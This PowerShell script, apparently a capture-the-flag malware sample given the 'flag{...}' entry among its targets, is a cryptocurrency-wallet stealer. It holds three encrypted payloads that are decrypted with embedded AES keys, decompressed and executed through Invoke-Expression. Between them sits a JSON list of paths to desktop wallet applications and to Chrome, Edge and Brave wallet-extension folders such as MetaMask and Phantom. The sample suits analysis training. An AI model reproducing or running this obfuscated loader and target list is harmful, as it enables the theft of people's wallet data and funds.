$base64coded = "kW7O7OQwAGGkqi7KGfpTlZBdNZf1gOVpkhIvcP9HAB0PZZt14VznxRaVzGzf65ONOkNVK2b19Tcdi7h/9CDRk2sAXtW8Ygyezgm/n2z63t0twjZlNxTDDOauz7ISvF6+p3SOJwgZ/6QQ7uKtjnH/4HFMPsKxiRAqS1mcLfaLwRVHr79qBzuMJU9PRlwkDDiK0lyHZ68RdSSMsEGNJ1w72pN7oybuCV23Gy4x4JAwPCa5KAsQU9ItJ9t3AAI6TK9KgubRL+n+H2D/8CEDbYMFtEExthjAhLlVyHVUmXvqgZYoDCGq+16yoIIDU0KdzLXQGvAjmFqhjutoclaUxJEUrZhULPiEAfNBZPm3KaANHFDNj4JZswIaS6Xeg2VaSBwC1rG8jspTyIqluK/zuCJnwvtNTMlDXTX+T5/yGeD/y39eAs/8uPOR7PjbgfAlnrcASvKZZk3pEDoRauwe4iDGuw6OWwda3/5y/jjFfXS5ZX+aMq1yahx4nD1kOQCmIhhEYtFacMEvYCiLFfiktgT3M/7NY40nR/D/83Yl5DIP7a4FG5jAsz/gxA9jqbCRd5um2wqkJ5UOqU9Dg/TBA6q7FuSGr8K2tbICkf5z7msJy0b+twcoryw4EWySo1b11IrL+menb2dsrnLO8lIgEg+c1jdXMG9/TjI6pN54r7WEjx8hMP8tqMdpvW02DgrEc4O8lYTT18v7j8IXRpFa8drK5LZZwyxRv92qrKqiSJXEyWNJmd6Hq+k42USrK2Rne2GyEPUpmP8PpPMB4m7zsv9PBf2yOFK04s1GUriSWs0dXKIENrHkZNNdyzqVOvL7f8bZLSvQbOuo1NWpkrALax5V+TpU+TIxf8Xw5csz6l0Pz28/lGILC0XIgtZrrxZf6igzru0v+KJymGJrFH3LgK5c8p9caF6yKDw1OJRzq696/B5mL81il1D55dX6YjlO2yX+i7PR8f6ayAGsi9L3ZN0oy1t7WrDOdYpALeEvkxKRsgJHH9Ygkv8csCUCGDvmaL7gAuZRcPn4WKUxh91FYD7PUOJSPqu2GT144tOegA9jF9FrAW/1jeCKq5Ejxh2llLVsbnqjMu2n3BJCvWLlBGuCdY5WN9LhzJVJ1OPP4gojNPF6MZYzIDgomoiFVYNv0y0BfrmUE8PRZLBdU2C7Iw4QRopiyBUqxxAgK3xuf6TopnmdlsqnQmofO9ysnL8tOB82dRBzMClEJV1klF8gpv9cuRT9p2Ohy+DZbQXAHsyIMWDP3MoIlLNtbG+vm30Z5Mtc5cWKQsFwgsG/EtSJJ7/P9UVe4qzS50bR7sIc1O1IZROT0tUOT0wxEVu8/cTlTW4ZMeN6GvvLsv58kp3sF2WLMfgBuNVHnxh380pNAf3P9J3auAqJN9VHSA19hbNE7RxrwiAL3pYETbhxvm7HcMQc3WOGZO0SVuIimoQt44MbkZYIOI5Nx+rJ1TRFdmpLzcZwR3830RBZGkc1Vsd5+hFeOrlt0T4TkpL3sJ+3VVcS91aTSbpObBuEGnziJnaJ76tRB6r1nI0vAncVO3cfMHOln3o8O4clSSH0x+ruLIhYC1olQo3C8gvaCpzCHvIS9+QLZETzyTthmdoZJJb82sKLYFomhjeFB8XB9ZCuLFj40AB9ti4BUCfkVCaNu6K2QCbLGtA269nbsC1oy4LM9NOkOjXiEZrUNd/EWepNXmceJ6wxNOTadEt1AhfRW4Cj3v3SEfW9tP/4KndzAElCaeU2eBiIyBantIGLad6DFyiT5bJU7XxxXKu6Zt47MZhdYMLt"
$base64EncryptedFunction = $base64coded.Substring(32, $base64coded.Length - 64)
$key1 = "ofb6s8pcvXVysiuC"
$key2 = "LZhojW2ezSv95oQ5"
$key3 = "b168miPr1cJwdjMw"
$fullKey = $key1 + $key2 + $key3
$salt = "7AvGwoewDBg2MMCx"
$keyDerivation = [System.Security.Cryptography.Rfc2898DeriveBytes]::new($fullKey, [System.Text.Encoding]::UTF8.GetBytes($salt), 1000)
$keyBytes = $keyDerivation.GetBytes(32)
$iv = "7YPFdoDZCBqcBu4b"
$ivBytes = [System.Text.Encoding]::UTF8.GetBytes($iv)
if ($ivBytes.Length -lt 16) { $ivBytes = $ivBytes + @(0) * (16 - $ivBytes.Length) } elseif ($ivBytes.Length -gt 16) { $ivBytes = $ivBytes[0..15] }
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $keyBytes
$aes.IV = $ivBytes
$decryptor = $aes.CreateDecryptor()
$encryptedBytes = [System.Convert]::FromBase64String($base64EncryptedFunction)
$decryptedBytes = $decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedBytes.Length)
$memoryStream = New-Object System.IO.MemoryStream(, $decryptedBytes)
$gzipStream = New-Object System.IO.Compression.GZipStream($memoryStream, [System.IO.Compression.CompressionMode]::Decompress)
$streamReader = New-Object System.IO.StreamReader($gzipStream)
$decryptedFunction = $streamReader.ReadToEnd()
Invoke-Expression $decryptedFunction
$base64coded = "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f0uvsuhlLfEwjV6qMSkwzc1X09atcM2e"
$base64EncryptedFunction = $base64coded.Substring(32, $base64coded.Length - 64)
$key1 = "FrF4bjTWaMPE0FU8"
$key2 = "Q97TqDXKDnHOnFne"
$key3 = "b1x7oT7LAtZq5u6G"
$fullKey = $key1 + $key2 + $key3
$salt = "otsGCfKOBaigJBw6"
$keyDerivation = [System.Security.Cryptography.Rfc2898DeriveBytes]::new($fullKey, [System.Text.Encoding]::UTF8.GetBytes($salt), 1000)
$keyBytes = $keyDerivation.GetBytes(32)
$iv = "Q4NfCimUeuzmsytE"
$ivBytes = [System.Text.Encoding]::UTF8.GetBytes($iv)
if ($ivBytes.Length -lt 16) { $ivBytes = $ivBytes + @(0) * (16 - $ivBytes.Length) } elseif ($ivBytes.Length -gt 16) { $ivBytes = $ivBytes[0..15] }
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $keyBytes
$aes.IV = $ivBytes
$decryptor = $aes.CreateDecryptor()
$encryptedBytes = [System.Convert]::FromBase64String($base64EncryptedFunction)
$decryptedBytes = $decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedBytes.Length)
$memoryStream = New-Object System.IO.MemoryStream(, $decryptedBytes)
$gzipStream = New-Object System.IO.Compression.GZipStream($memoryStream, [System.IO.Compression.CompressionMode]::Decompress)
$streamReader = New-Object System.IO.StreamReader($gzipStream)
$decryptedFunction = $streamReader.ReadToEnd()
Invoke-Expression $decryptedFunction
$pathdata = 
@'
[
    {
        "root": "%appdata%",
        "targets": [
            {
                "name": "Exodus-A",
                "path": "Exodus"
            },
            {
                "name": "Atomic-A",
                "path": "Atomic Wallet"
            },
            {
                "name": "Electrum-A",
                "path": "Electrum"
            },
            {
                "name": "Ledger-A",
                "path": "Ledger Live"
            },
            {
                "name": "Jaxx-A",
                "path": "Jaxx Liberty"
            },
            {
                "name": "com.liberty.jaxx-A",
                "path": "com.liberty.jaxx"
            },
            {
                "name": "Guarda-A",
                "path": "Guarda"
            },
            {
                "name": "Armory-A",
                "path": "Armory"
            },
            {
                "name": "DELTA-A",
                "path": "DELTA"
            },
            {
                "name": "TREZOR-A",
                "path": "TREZOR Bridge"
            },
            {
                "name": "Bitcoin-A",
                "path": "Bitcoin"
            },
            {
                "name": "binance-A",
                "path": "binance"
            },
            {
                "name": "mexc-A",
                "path": "mexc"
            }
        ]
    },
    {
        "root": "%localappdata%",
        "targets": [
            {
                "name": "Blockstream-A",
                "path": "Blockstream Green"
            },
            {
                "name": "Coinomi-A",
                "path": "Coinomi"
            }
        ]
    },
    {
        "root": "%localappdata%\\Google\\Chrome\\User Data\\Default\\Extensions",
        "targets": [
            {
                "name": "Metamask-C",
                "path": "nkbihfbeogaeaoehlefnkodbefgpgknn"
            },
            {
                "name": "MEWcx-C",
                "path": "nlbmnnijcnlegkjjpcfjclmcfggfefdm"
            },
            {
                "name": "Coin98-C",
                "path": "aeachknmefphepccionboohckonoeemg"
            },
            {
                "name": "Binance-C",
                "path": "fhbohimaelbohpjbbldcngcnapndodjp"
            },
            {
                "name": "Jaxx-C",
                "path": "cjelfplplebdjjenllpjcblmjkfcffne"
            },
            {
                "name": "Coinbase-C",
                "path": "hnfanknocfeofbddgcijnmhnfnkdnaad"
            },
            {
                "name": "Ronin-C",
                "path": "fnjhmkhhmkbjkkabndcnnogagogbneec"
            },
            {
                "name": "Trust-C",
                "path": "egjidjbpglichdcondbcbdnbeeppgdph"
            },
            {
                "name": "Venom-C",
                "path": "ojggmchlghnjlapmfbnjholfjkiidbch"
            },
            {
                "name": "Sui-C",
                "path": "opcgpfmipidbgpenhmajoajpbobppdil"
            },
            {
                "name": "Martian-C",
                "path": "efbglgofoippbgcjepnhiblaibcnclgk"
            },
            {
                "name": "Tron-C",
                "path": "ibnejdfjmmkpcnlpebklmnkoeoihofec"
            },
            {
                "name": "Petra-C",
                "path": "ejjladinnckdgjemekebdpeokbikhfci"
            },
            {
                "name": "Pontem-C",
                "path": "phkbamefinggmakgklpkljjmgibohnba"
            },
            {
                "name": "Fewcha-C",
                "path": "ebfidpplhabeedpnhjnobghokpiioolj"
            },
            {
                "name": "Math-C",
                "path": "afbcbjpbpfadlkmhmclhkeeodmamcflc"
            },
            {
                "name": "Authenticator-C",
                "path": "bhghoamapcdpbohphigoooaddinpkbai"
            },
			{
                "name": "ExodusWeb3-C",
                "path": "aholpfdialjgjfhomihkjbmgjidlcdno"
            },
            {
                "name": "Phantom-C",
                "path": "bfnaelmomeimhlpmgjnjophhpkkoljpa"
            },
            {
                "name": "Core-C",
                "path": "agoakfejjabomempkjlepdflaleeobhb"
            },
            {
                "name": "Tokenpocket-C",
                "path": "mfgccjchihfkkindfppnaooecgfneiii"
            },
            {
                "name": "Safepal-C",
                "path": "lgmpcpglpngdoalbgeoldeajfclnhafa"
            },
            {
                "name": "Solfare-C",
                "path": "bhhhlbepdkbapadjdnnojkbgioiodbic"
            },
			{
                "name": "Kaikas-C",
                "path": "jblndlipeogpafnldhgmapagcccfchpi"
            },
			{
                "name": "iWallet-C",
                "path": "kncchdigobghenbbaddojjnnaogfppfj"
            },
			{
                "name": "Yoroi-C",
                "path": "ffnbelfdoeiohenkjibnmadjiehjhajb"
            },
			{
                "name": "Guarda-C",
                "path": "hpglfhgfnhbgpjdenjgmdgoeiappafln"
            },
			{
                "name": "Wombat-C",
                "path": "amkmjjmmflddogmhpjloimipbofnfjih"
            },
			{
                "name": "Oxygen-C",
                "path": "fhilaheimglignddkjgofkcbgekhenbh"
            },
			{
                "name": "Guild-C",
                "path": "nanjmdknhkinifnkgdcggcfnhdaammmj"
            },
			{
                "name": "Saturn-C",
                "path": "nkddgncdjgjfcddamfgcmfnlhccnimig"
            },			
			{
                "name": "Terra-C",
                "path": "aiifbnbfobpmeekipheeijimdpnlpgpp"
            },
			{
                "name": "Harmony-C",
                "path": "fnnegphlobjdpkhecapkijjdkgcjhkib"
            },
			{
                "name": "Kardia-C",
                "path": "cgeeodpfagjceefieflmdfphplkenlfk"
            },
			{
                "name": "Pali-C",
                "path": "mgffkfbidihjpoaomajlbgchddlicgpn"
            },
			{
                "name": "BoltX-C",
                "path": "aodkkagnadcbobfpggfnjeongemjbjca"
            },
			{
                "name": "Liquality-C",
                "path": "kpfopkelmapcoipemfendmdcghnegimn"
            },
			{
                "name": "XDEFI-C",
                "path": "hmeobnfnfcmdkdcmlblgagmfpfboieaf"
            },
			{
                "name": "Nami-C",
                "path": "lpfcbjknijpeeillifnkikgncikgfhdo"
            },
			{
                "name": "MaiarDEFI-C",
                "path": "dngmlblcodfobpdpecaadgfbcggfjfnm"
            },
			{
                "name": "TempleTezos-C",
                "path": "ookjlbkiijinhpmnjffcofjonbfbgaoc"
            },
			{
                "name": "XMRpt-C",
                "path": "eigblbgjknlfbajkfhopmcojidlgcehm"
             },
             {
                "name": "Flag",
                "path": "flag{27768419fd176648b335aa92b8d2dab2}"
             }
        ]
    },
    {
        "root": "%localappdata%\\Microsoft\\Edge\\User Data\\Default\\Extensions",
        "targets": [
            {
                "name": "Metamask-E",
                "path": "ejbalbakoplchlghecdalmeeeajnimhm"
            },
			{
                "name": "Metamask-EE",
                "path": "nkbihfbeogaeaoehlefnkodbefgpgknn"
            },
            {
                "name": "Coinomi-E",
                "path": "gmcoclageakkbkbbflppkbpjcbkcfedg"
            }
        ]
    },
    {
        "root": "%localappdata%\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Extensions",
        "targets": [
            {
                "name": "Metamask-B",
                "path": "nkbihfbeogaeaoehlefnkodbefgpgknn"
            },
            {
                "name": "MEWcx-B",
                "path": "nlbmnnijcnlegkjjpcfjclmcfggfefdm"
            },
            {
                "name": "Coin98-B",
                "path": "aeachknmefphepccionboohckonoeemg"
            },
            {
                "name": "Binance-B",
                "path": "fhbohimaelbohpjbbldcngcnapndodjp"
            },
            {
                "name": "Jaxx-B",
                "path": "cjelfplplebdjjenllpjcblmjkfcffne"
            },
            {
                "name": "Coinbase-B",
                "path": "hnfanknocfeofbddgcijnmhnfnkdnaad"
            }
        ]
    }
]
'@;

$base64coded = "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"
$base64EncryptedFunction = $base64coded.Substring(32, $base64coded.Length - 64)
$key1 = "8wXMB0kG2OXu0Oph"
$key2 = "YOqewwSuTVBbnla2"
$key3 = "UI3VayOL0s8UQ91L"
$fullKey = $key1 + $key2 + $key3
$salt = "j6KzrYBisqQkxZ4R"
$keyDerivation = [System.Security.Cryptography.Rfc2898DeriveBytes]::new($fullKey, [System.Text.Encoding]::UTF8.GetBytes($salt), 1000)
$keyBytes = $keyDerivation.GetBytes(32)
$iv = "F4TADv9SfuzWsjxS"
$ivBytes = [System.Text.Encoding]::UTF8.GetBytes($iv)
if ($ivBytes.Length -lt 16) { $ivBytes = $ivBytes + @(0) * (16 - $ivBytes.Length) } elseif ($ivBytes.Length -gt 16) { $ivBytes = $ivBytes[0..15] }
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $keyBytes
$aes.IV = $ivBytes
$decryptor = $aes.CreateDecryptor()
$encryptedBytes = [System.Convert]::FromBase64String($base64EncryptedFunction)
$decryptedBytes = $decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedBytes.Length)
$memoryStream = New-Object System.IO.MemoryStream(, $decryptedBytes)
$gzipStream = New-Object System.IO.Compression.GZipStream($memoryStream, [System.IO.Compression.CompressionMode]::Decompress)
$streamReader = New-Object System.IO.StreamReader($gzipStream)
$decryptedFunction = $streamReader.ReadToEnd()
Invoke-Expression $decryptedFunction